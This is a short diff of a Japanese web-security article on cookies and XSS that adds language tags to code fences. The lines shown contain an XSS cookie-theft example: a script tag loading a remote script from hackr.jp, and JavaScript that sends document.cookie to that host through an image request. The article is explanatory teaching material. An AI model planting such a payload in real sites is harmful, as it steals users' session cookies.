@@ -77,13 +77,13 @@ Noneの値を設定すると、ブラウザはすべての閲覧コンテキス�
 
 下記のようなスクリプトを仕込むことで、ユーザーのCookieをXSSによって奪うことができる。
 
-```
+``` JavaScript
 <script src=http://hackr.jp/xss.js></scriot>
 ```
 
 このスクリプトが指し示す http://hackr.jp/xss.js は下記のJavaScriptが記述されている
 
-```
+``` JavaScript
 const content = escape(document.cookie);
 document.write("<img src=http://hackr.jp/?");
 document.write(content);
